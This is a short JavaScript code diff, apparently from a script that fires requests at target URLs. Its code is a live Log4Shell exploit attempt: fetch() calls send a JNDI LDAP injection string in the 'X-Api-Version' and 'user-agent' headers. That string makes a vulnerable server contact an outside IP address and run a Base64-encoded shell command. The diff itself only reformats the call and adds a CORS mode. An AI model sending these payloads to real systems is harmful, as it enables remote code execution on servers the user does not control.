@@ -103,8 +103,8 @@
                         }
                         // Log4shell
                         try {
-                            const res = await fetch(url,
-                            {
+                            const res = await fetch(url, {
+                                mode: 'cors',
                                 headers: {
                                     'X-Api-Version': '${jndi:ldap://54.165.153.184:443/Basic/Command/Base64/dG91Y2ggL3RtcC9oaWZyb21udWxscmlvdC5jb20=}',
                                     'user-agent': '${jndi:ldap://54.165.153.184:443/Basic/Command/Base64/dG91Y2ggL3RtcC9oaWZyb21udWxscmlvdC5jb20=}'
